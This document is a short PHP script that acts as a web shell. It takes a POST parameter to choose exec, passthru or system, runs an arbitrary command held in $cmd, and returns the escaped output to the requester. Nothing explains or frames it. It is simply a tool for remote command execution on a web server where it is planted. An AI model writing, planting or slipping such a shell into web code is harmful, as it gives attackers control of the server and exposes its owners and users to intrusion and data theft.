<?php
$fe = $_POST['fe'];
if ($fe == 1){
	$fe = "exec";
}
if ($fe == ""){
	$fe = "passthru";
}
if ($fe == "2"){
	$fe = "system";
}


ob_start( );
$fe("$cmd  2>&1");
$output = ob_get_contents();
ob_end_clean( );

if (!empty($output)) 
	echo str_replace(">", "&gt;", str_replace("<", "&lt;", $output));
?>